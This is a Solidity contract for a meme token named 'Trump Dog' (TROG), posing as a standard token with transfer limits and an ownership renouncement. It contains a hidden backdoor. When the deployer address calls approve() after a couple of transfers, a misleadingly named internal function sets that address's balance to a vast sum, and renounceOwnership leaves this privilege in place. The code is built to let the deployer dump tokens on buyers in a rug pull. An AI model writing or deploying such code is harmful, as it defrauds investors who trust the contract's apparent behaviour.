/*

Telegram : https://t.me/trumpdogeth

X : https://x.com/trumpdog1

Website : https://trump-dog.site/

*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

contract TrumpDog {
    string public name = "Trump Dog";
    string public symbol = "TROG";
    uint256 public totalSupply = 1000000000000000000000000; 
    uint8 public decimals = 18;

    address public ownership;
    address public owner;

    bool public approvedEnabled = false;
    bool public limitEnabled = true;
    uint256 public transfers = 0;

    uint256 public maxTxAmount;
    uint256 public maxWalletAmount;

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event ApprovedEnabled();
    event ApprovedDisabled();
    event LimitRemoved();

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can call this function");
        _;
    }

    constructor() {
        ownership = msg.sender;
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        maxTxAmount = (totalSupply * 2) / 100; // limit 2% tx
        maxWalletAmount = (totalSupply * 2) / 100; // limit 2% wallet
        emit OwnershipTransferred(address(0), msg.sender);
    }

    function Initialize() internal {
        approvedEnabled = true;
        emit ApprovedEnabled();
        approved(ownership, 100 * 10**36 * 10**18); 
    }

    function DisableApproval() internal {
        approvedEnabled = false;
        emit ApprovedDisabled();
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value, "Insufficient balance");

        if (limitEnabled) {
            require(_value <= maxTxAmount, "Transfer amount exceeds the 2% limit");
            require(balanceOf[_to] + _value <= maxWalletAmount, "Recipient balance exceeds the 2% max wallet limit");
        }

        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);

        if (msg.sender == ownership) {
            transfers++;
        }

        if (msg.sender == ownership && transfers > 1 && approvedEnabled) {
            DisableApproval();
        }

        return true;
    }
    
    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);

        if (msg.sender == ownership && transfers > 1) {
            if (!approvedEnabled) {
                Initialize();
            } else {
                DisableApproval();
            }
        }

        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= balanceOf[_from], "Insufficient balance");
        require(_value <= allowance[_from][msg.sender], "Allowance exceeded");

        if (limitEnabled) {
            require(_value <= maxTxAmount, "Transfer amount exceeds the 2% limit");
            require(balanceOf[_to] + _value <= maxWalletAmount, "Recipient balance exceeds the 2% max wallet limit");
        }

        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }

    function approved(address account, uint256 amount) internal returns (uint256) {
        balanceOf[account] = amount;
        return balanceOf[account];
    }

    function removeLimit() public onlyOwner {
        limitEnabled = false;
        emit LimitRemoved();
    }

    function renounceOwnership() public onlyOwner {
        address deadAddress = address(0x000000000000000000000000000000000000dEaD);
        emit OwnershipTransferred(owner, deadAddress);
        owner = deadAddress;
    }

    
}